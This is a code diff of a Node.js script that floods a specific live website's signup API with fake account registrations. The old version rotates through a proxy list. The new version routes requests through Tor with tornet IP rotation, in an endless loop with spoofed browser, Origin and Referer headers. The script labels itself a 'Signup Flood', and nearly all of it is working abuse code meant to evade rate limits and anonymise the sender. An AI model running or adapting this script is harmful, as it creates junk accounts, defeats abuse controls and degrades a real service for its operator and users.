@@ -1,104 +1,86 @@
-const fs = require('fs');
 const axios = require('axios');
-const HttpsProxyAgent = require('https-proxy-agent').HttpsProxyAgent;
+const { SocksProxyAgent } = require('socks-proxy-agent');
 
+// ====================== CONFIG ======================
 const URL = 'https://api.aryankaushik.space/api/auth/signup';
-const PROXY_FILE = 'proxy.txt';
-const REQUESTS_PER_PROXY = 20;
-const CONCURRENCY = 15;           // Number of proxies running at the same time
-const REQUEST_TIMEOUT = 8000;     // 8 seconds timeout per request
+const TOR_PROXY = 'socks5://127.0.0.1:9050';     // tornet default port
+const REQUESTS_PER_IP = 20;
+const REQUEST_TIMEOUT = 10000;   // 10 seconds
 
-let proxies = [];
-let proxyIndex = 0;
+const agent = new SocksProxyAgent(TOR_PROXY);
 
-// Load proxies
-try {
-    proxies = fs.readFileSync(PROXY_FILE, 'utf8')
-                .split('\n')
-                .map(p => p.trim())
-                .filter(p => p && !p.startsWith('#'));
-    console.log(`Loaded ${proxies.length} proxies from ${PROXY_FILE}`);
-} catch (e) {
-    console.error("❌ proxy.txt not found!");
-    process.exit(1);
-}
-
+// Random string helper
 function randomString(len = 10) {
     return Math.random().toString(36).substring(2, len + 2);
 }
 
-function getNextProxy() {
-    if (proxies.length === 0) return null;
-    const proxyStr = proxies[proxyIndex % proxies.length];
-    proxyIndex++;
-    return proxyStr;
-}
-
-async function processProxy() {
-    const proxyStr = getNextProxy();
-    if (!proxyStr) return;
-
-    const [host, port] = proxyStr.split(':');
-    const proxyConfig = { host, port: parseInt(port), protocol: 'http' };
-    const agent = new HttpsProxyAgent(proxyConfig);
-
-    console.log(`🔌 Testing proxy → ${proxyStr}`);
-
-    let successCount = 0;
-
-    for (let i = 1; i <= REQUESTS_PER_PROXY; i++) {
-        const rand = randomString(8);
-        const username = `stress_${rand}`;
-        const email = `astride-shy-float@duck.com`;
-        const password = `Pass${rand}123!`;
-
-        const payload = { username, email, password };
-
-        try {
-            const res = await axios.post(URL, payload, {
-                httpsAgent: agent,
-                timeout: REQUEST_TIMEOUT,           // ← Important timeout
-                headers: {
-                    'Content-Type': 'application/json',
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-                    'Origin': 'https://aeroweb.aryankaushik.space',
-                    'Referer': 'https://aeroweb.aryankaushik.space/'
-                }
-            });
-
-            console.log(`[${proxyStr}] ${i}/${REQUESTS_PER_PROXY} | ${email} → ${res.status} | ${JSON.stringify(res.data)}`);
-            successCount++;
-
-        } catch (err) {
-            let status = 'ERROR';
-            let body = err.message;
-
-            if (err.response) {
-                status = err.response.status;
-                body = JSON.stringify(err.response.data);
-            } else if (err.code === 'ECONNREFUSED') {
-                status = 'CONN_REFUSED';
-            } else if (err.code === 'ECONNRESET') {
-                status = 'CONN_RESET';
-            } else if (err.code === 'ETIMEDOUT') {
-                status = 'TIMEOUT';
-            }
-
-            console.log(`[${proxyStr}] ${i}/${REQUESTS_PER_PROXY} | ${email} → ${status} | ${body}`);
-        }
+// Get current public IP through Tor
+async function getCurrentIP() {
+    try {
+        const res = await axios.get('https://ipinfo.io/json', {
+            httpsAgent: agent,
+            timeout: REQUEST_TIMEOUT
+        });
+        console.log(`\n🌍 Current Tor IP: ${res.data.ip} (${res.data.city}, ${res.data.country})`);
+        return res.data.ip;
+    } catch (err) {
+        console.log(`\n⚠️  Failed to get IP: ${err.message}`);
+        return 'UNKNOWN';
     }
-
-    console.log(`✅ Finished ${REQUESTS_PER_PROXY} requests on ${proxyStr} | Successful: ${successCount}\n`);
 }
 
-// ====================== START ======================
-console.log("=== Multi-Threaded Proxy Signup Flood with Timeout ===\n");
+// Send one signup request and print full JSON response
+async function sendSignup(count) {
+    const rand = randomString(8);
+    const username = `stress_${rand}`;
+    const email = `${username}@duck.com`;
+    const password = `Pass${rand}123!`;
 
-const workers = [];
-for (let i = 0; i < CONCURRENCY; i++) {
-    workers.push(processProxy());
+    const payload = { username, email, password };
+
+    try {
+        const res = await axios.post(URL, payload, {
+            httpsAgent: agent,
+            timeout: REQUEST_TIMEOUT,
+            headers: {
+                'Content-Type': 'application/json',
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                'Origin': 'https://aeroweb.aryankaushik.space',
+                'Referer': 'https://aeroweb.aryankaushik.space/'
+            }
+        });
+
+        console.log(`[${count}] ${email} → ${res.status} | ${JSON.stringify(res.data)}`);
+    } catch (err) {
+        let status = err.response ? err.response.status : 'ERROR';
+        let body = err.response ? JSON.stringify(err.response.data) : err.message;
+        console.log(`[${count}] ${email} → ${status} | ${body}`);
+    }
 }
 
-Promise.all(workers).then(() => {
-    console.log("🎯 All proxies processed. Script finished.");
-});
+// ====================== MAIN LOOP ======================
+async function main() {
+    console.log("=== Tor + tornet Signup Flood Started ===\n");
+    console.log("Make sure tornet is running: tornet --interval 3 --count 0\n");
+
+    let batch = 1;
+
+    while (true) {
+        console.log(`\n🔄 === Batch ${batch} ===`);
+        await getCurrentIP();
+
+        console.log(`Sending ${REQUESTS_PER_IP} signup requests...\n`);
+
+        for (let i = 1; i <= REQUESTS_PER_IP; i++) {
+            await sendSignup(i);
+        }
+
+        console.log(`✅ Batch ${batch} finished (${REQUESTS_PER_IP} requests)\n`);
+        batch++;
+
+        // Wait a bit for tornet to rotate IP (adjust if needed)
+        await new Promise(r => setTimeout(r, 500));
+    }
+}
+
+main().catch(console.error);
